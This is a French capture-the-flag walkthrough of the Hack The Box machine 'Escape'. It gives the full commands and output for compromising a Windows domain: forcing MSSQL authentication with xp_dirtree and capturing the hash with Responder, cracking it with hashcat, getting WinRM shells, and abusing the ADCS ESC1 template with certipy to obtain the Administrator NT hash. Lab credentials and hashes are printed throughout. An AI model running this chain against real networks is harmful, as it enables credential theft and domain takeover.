## Description
Escape est une machine Windows Active Directory de difficulté Medium qui démarre avec un partage SMB qui permet aux utilisateurs authentifiés invités de télécharger un fichier PDF sensible. Dans le fichier PDF, des informations d'identification temporaires sont disponibles pour accéder à un service MSSQL fonctionnant sur la machine. Un attaquant est en mesure de forcer le service MSSQL à s'authentifier sur sa machine et de capturer le hachage. Il s'avère que le service s'exécute sous un compte d'utilisateur et que le hachage est cassable. Disposant d'un ensemble d'informations d'identification valides, un attaquant est en mesure d'obtenir l'exécution de commandes sur la machine à l'aide de WinRM. En énumérant la machine, un fichier journal révèle les informations d'identification de l'utilisateur `ryan.cooper`. Une énumération plus poussée de la machine révèle qu'une autorité de certification est présente et qu'un modèle de certificat est vulnérable à l'attaque `ESC1`, ce qui signifie que les utilisateurs qui peuvent utiliser ce modèle peuvent demander des certificats pour n'importe quel autre utilisateur du domaine, y compris les administrateurs de domaine. Ainsi, en exploitant la vulnérabilité `ESC1`, un attaquant est en mesure d'obtenir un certificat valide pour le compte Administrateur et de l'utiliser pour obtenir le hash de l'utilisateur Administrateur.< 

## Recon
Pour commencer je lance mon outil `nmapauto`
```terminal

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 20:11 CST
Initiating Ping Scan at 20:11
Scanning 10.129.228.253 [4 ports]
Completed Ping Scan at 20:11, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:11
Completed Parallel DNS resolution of 1 host. at 20:11, 0.02s elapsed
Initiating SYN Stealth Scan at 20:11
Scanning 10.129.228.253 [1000 ports]
Discovered open port 135/tcp on 10.129.228.253
Discovered open port 139/tcp on 10.129.228.253
Discovered open port 445/tcp on 10.129.228.253
Discovered open port 53/tcp on 10.129.228.253
Discovered open port 389/tcp on 10.129.228.253
Discovered open port 88/tcp on 10.129.228.253
Discovered open port 593/tcp on 10.129.228.253
Discovered open port 1433/tcp on 10.129.228.253
Discovered open port 3269/tcp on 10.129.228.253
Discovered open port 464/tcp on 10.129.228.253
Discovered open port 636/tcp on 10.129.228.253
Discovered open port 3268/tcp on 10.129.228.253
Completed SYN Stealth Scan at 20:11, 20.61s elapsed (1000 total ports)
Nmap scan report for 10.129.228.253
Host is up (0.28s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Open Ports : 53,88,135,139,389,445,464,593,636,1433,3268,3269                                                                                                

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 20:11 CST
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 20:11
Completed Parallel DNS resolution of 1 host. at 20:11, 0.00s elapsed
Initiating SYN Stealth Scan at 20:11
Scanning 10.129.228.253 [65535 ports]
Discovered open port 135/tcp on 10.129.228.253
Discovered open port 445/tcp on 10.129.228.253
Discovered open port 53/tcp on 10.129.228.253
Discovered open port 139/tcp on 10.129.228.253
Discovered open port 9389/tcp on 10.129.228.253
Discovered open port 3268/tcp on 10.129.228.253
SYN Stealth Scan Timing: About 34.44% done; ETC: 20:12 (0:00:59 remaining)
Discovered open port 5985/tcp on 10.129.228.253
Discovered open port 1433/tcp on 10.129.228.253
Discovered open port 464/tcp on 10.129.228.253
Discovered open port 57390/tcp on 10.129.228.253
Discovered open port 636/tcp on 10.129.228.253
Discovered open port 49717/tcp on 10.129.228.253
Discovered open port 593/tcp on 10.129.228.253
Discovered open port 389/tcp on 10.129.228.253
SYN Stealth Scan Timing: About 68.77% done; ETC: 20:13 (0:00:41 remaining)
Discovered open port 49690/tcp on 10.129.228.253
Discovered open port 49713/tcp on 10.129.228.253
Discovered open port 3269/tcp on 10.129.228.253
Discovered open port 88/tcp on 10.129.228.253
Host is up (0.29s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-29 10:13:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
57390/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Open Ports : 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49717,57390                                                  
```

Ici avec mon nmap je trouve que le domain est `sequel.htb`

- DNS ouvert
- Kerberoas ouvert au port `88`
- SMB ouvert (139 & 445)
- MSSQL ouvert au port 1433
- MSRPC au port 135
- WINRM au port 5985

```
└─# echo "$ip  $host $host2" | tee -a /etc/hosts
10.129.228.253  sequel.htb DC.sequel.htb
```

**Deeper Scan**
Un second scan pour avoir plus d'infos toujours
```
└─# nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49717,57390 $ip   
Nmap scan report for sequel.htb (10.129.228.253)
Host is up (0.45s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-29 10:21:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:41+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:39+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-02-29T10:22:40+00:00; +7h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-29T10:07:39
|_Not valid after:  2054-02-28T10:07:39
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:41+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:39+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
57390/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-29T10:22:01
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
```

**SMB**
Pour debuter mon Pentest je debute toujours avec `netexec` ou `crackmapexec` pour voir s'il ya des sessions anonymous et des `shares` accessible
```
└─# nxc smb $ip -u '' -p '' --shares                                                                                  
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
Ici, les utilisateurs `anonyme` sont autorisee mais ils n'affiche pas les `shares`
- Une methodes que j'ai appris recement c'est de mettre un nom quelconque dans le `-u `

```
└─# nxc smb $ip -u 'notrealuser' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\notrealuser: 
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```

On a des shares avec des privilege de lire. mais d'abord voyons le `MSRPC` si nous pouvons enumerer des utilisateurs

**MSRPC**
```
└─# rpcclient -N -U '' $ip         
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

No ca marche pas alors continuons et lisons les `shares`
```
└─# smbclient -N //sequel.htb/IPC$          
Try "help" to get a list of possible commands.
smb: \> dir'
dir': command not found
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 

└─# smbclient -N //sequel.htb/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 05:51:25 2022
  ..                                  D        0  Sat Nov 19 05:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022

                5184255 blocks of size 4096. 1467041 blocks available
smb: \> 
```
Dans le 2eme `shares` je trouve un PDF. telechargeons le
```
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 
```

Je vois un long texte dans ce pdf mais donc reperons les utilisateurs
*For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user `PublicUser` and password `GuestUserCantWrite1` .*

- j'ai trouver un user et un password
- J'ai aussi trouver plusieurs utilisateurs dans ce pdf

Alors quoi faire?
- D'abord je vais faire un `kerbrute` avec ces users que j'ai pu trouver(Aucun user n'est valides)
- Alors utilisons le username et le mot de passe dans `netexec`

```
└─# nxc smb $ip -u 'PublicUser' -p 'GuestUserCantWrite1'
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
```

On a un utilisateur valides. Essayons le `MSRPC`
```
└─# rpcclient -U 'PublicUser' $ip 
Password for [WORKGROUP\PublicUser]:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 2F A2 4C BB 67 D8 32 3D   49 20 13 2B C1 3B B8 73   /.L.g.2= I .+.;.s
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
Ca ne marche pas.
- Bon, alors comme j'ai un user et un mot de passe et si je l'essayais dans le `mssql` avec `impacket`

```
─# impacket-mssqlclient sequel.htb/publicuser:GuestUserCantWrite1@10.129.228.253
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

Dans le `mssql` ca marche tres bien, Donc pour continuer on a besoin de :

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

## Steal NetNTLM hash / Relay attack
Dans la description on nous dit qu'on peux forcer le `mssql` a se connecter a notre machine ensuite de capture le `hash`

```
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.5\anything\yh
subdirectory   depth   file   
------------   -----   ----   
SQL (PublicUser  guest@master)>

```
ensuite j'ouvre un `responder`
```
└─# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[+] Listening for events...                                                                  

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:d47167e5e5b219a3:8F3DF57CCC7B5D7EB7666A0DBD09D29D:010100000000000080FE2C0D886ADA0146BF2C592825CC6A0000000002000800520035005500410001001E00570049004E002D004E004900490046004B004A004C003400490031004D0004003400570049004E002D004E004900490046004B004A004C003400490031004D002E0052003500550041002E004C004F00430041004C000300140052003500550041002E004C004F00430041004C000500140052003500550041002E004C004F00430041004C000700080080FE2C0D886ADA01060004000200000008003000300000000000000000000000003000003396D999AB019855FF5D352A6808F8734ABCB8DAA7F62CECCBDE3B594EE5E44A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000  

```
Je viens de capturer le `NTLMv2-SSP` de l'utilisateur `sql_svc`
- Maintenant on doit le cracker
- https://infinitelogins.com/2020/04/16/abusing-llmnr-nbtns-part-2-cracking-ntlmv2-hashes/

```
─# hashcat -a 0 -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
SQL_SVC::sequel:d47167e5e5b219a3:8f3df57ccc7b5d7eb7666a0dbd09d29d:010100000000000080fe2c0d886ada0146bf2c592825cc6a0000000002000800520035005500410001001e00570049004e002d004e004900490046004b004a004c003400490031004d0004003400570049004e002d004e004900490046004b004a004c003400490031004d002e0052003500550041002e004c004f00430041004c000300140052003500550041002e004c004f00430041004c000500140052003500550041002e004c004f00430041004c000700080080fe2c0d886ada01060004000200000008003000300000000000000000000000003000003396d999ab019855ff5d352a6808f8734abcb8daa7f62ceccbde3b594ee5e44a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0035000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:d47167e5e5b219a3:8f3df57ccc7b5d7eb7...000000
Time.Started.....: Wed Feb 28 20:58:39 2024 (6 secs)
Time.Estimated...: Wed Feb 28 20:58:45 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2062.3 kH/s (1.49ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10702848/14344387 (74.61%)
Rejected.........: 0/10702848 (0.00%)
Restore.Point....: 10698752/14344387 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPITALU -> RBRB67RB
Hardware.Mon.#1..: Temp: 43c Util: 68%

Started: Wed Feb 28 20:58:24 2024
Stopped: Wed Feb 28 20:58:47 2024
```

Ok Maintenant que j'ai un autre mot de passe alors quoi faire?

- D'abord je vais essayer de me connecter sur `winrm` avec cet utilisateur

```terminal
└─# evil-winrm -i $ip -u sql_svc -p REGGIE1234ronnie
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

D'ici je vais aller dans la directory des Users

```terminal
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

Je vois trois utilisateurs, dont l'admin, Ryan.Cooper et le sql_svc que j'ai deja eu acces. alors je crois que je dois chercher des infos pour avoir acces a l'utilisateur `Ryan.Cooper`.

Pour cela je vais checker et voir s'il ya d'interessante fichier, je me rend dans le ``C:\``
```terminal
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows


*Evil-WinRM* PS C:\> 
```

D'ici je vais verifier le `SQLServer`

```terminal
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

Dans cet SQLServer je trouve un Directory `Logs` et a l'interieur j'ai un fichier backup des erreurs en `.bak`
Donc je vais le download sur ma machine et l'analyser

```terminal
Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK /home/blo/CTFs/Boot2root/HTB/ERRORLOG.BAK
                                        
Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to /home/blo/CTFs/Boot2root/HTB/ERRORLOG.BAK
                                        
Info: Download successful!
```

Pour l'analyse je cherche tout les strings commenecant par `user`, `password` Dans mon sublime Text et je trouve :

```terminal
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.

```

Ici l'utilisateur `Ryan.Cooper` a essaye de se logger avec un mot de passe invalide et en bas je vois un utilisateur qui ressemble bien a un password, donc je vais combiner les deux et voir

```terminal
└─# evil-winrm -i $ip -u ryan.cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
3b2c99e40f1df5c2a4dc9b5f2bc6b6a5

```

Ouais ca a bien marcher et j'ai pu avoir le flag user

## Privilege Escalation
Dans la description on me dit que Une énumération plus poussée de la machine révèle qu'une autorité de certification est présente et qu'un modèle de certificat est vulnérable à l'attaque `ESC1`, ce qui signifie que les utilisateurs qui peuvent utiliser ce modèle peuvent demander des certificats pour n'importe quel autre utilisateur du domaine, y compris les administrateurs de domaine. Ainsi, en exploitant la vulnérabilité `ESC1`, un attaquant est en mesure d'obtenir un certificat valide pour le compte Administrateur et de l'utiliser pour obtenir le hash de l'utilisateur Administrateur.< 

Je crois que la je dois enumerer les certificates et les compromettre pour etre Domain Admins
```terminal
└─# nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 


└─# nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS        10.129.228.253  389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA

```

Pour enumerer des certif j'ajoute le `-M adcs` et bien je trouve un PKI et un CN. Donc maintenant je vais utiliser `certipy-ad` pour trouver des templates vulnerables

```terminal
─# certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```

- [Exploit AD Cs](https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/)
- [Exploit AD Cs](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/)

Certipy-ad trouve que les certificats sont vulnerable aux `ESC1`. car l'utilisateur `can enroll, enrollee supplies subject and template allows client authentication`
- Pour exploiter l'`ESC1`, le template doit répondre à certains critères. Le modèle doit avoir :

  - Les droits d'inscription sont définis pour le groupe auquel appartient notre utilisateur afin que nous puissions demander un nouveau certificat à l'autorité de certification (CA).
  - Utilisation étendue de la clé : Authentification du client signifie que le certificat généré sur la base de ce modèle peut authentifier les ordinateurs du domaine.
  - Enrollee Supplies Subject est défini sur True, ce qui signifie que nous pouvons fournir un SAN (Subject Alternate Name).
  - Aucune approbation du gestionnaire n'est requise, ce qui signifie que la demande est approuvée automatiquement.


Alors je vais essayer de l'exploiter avec le meme outil

```terminal
└─# certipy-ad req  -u ryan.cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn Administrator@sequel.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
maintenant que j'ai le `administrator.pfx` alors je vais utiliser le meme outil avec l'option `auth` qui me donnera le hash de l'utilisateur

```terminal
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
quelque erreurs avec les heures de la box distant et de ma machine avec ces commandes je fixe

- `sudo timedatectl set-ntp off`
- `rdate $ip`

```terminal
└─# certipy-ad auth -pfx administrator.pfx
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

